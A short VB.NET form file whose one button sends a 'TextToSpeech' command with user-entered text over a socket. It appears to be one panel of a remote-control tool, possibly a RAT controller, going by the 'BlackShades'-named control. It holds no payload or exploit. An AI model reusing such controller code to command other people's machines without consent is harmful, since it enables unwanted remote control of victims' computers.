Public Class Form13
    Public sock As Integer
    Private Sub Form13_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load

    End Sub

    Private Sub BlackShadesNetButton1_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton1.Click
        Form1.s.Send(sock, "TextToSpeech" & Form1.yy & TextBox1.Text)
    End Sub
End Class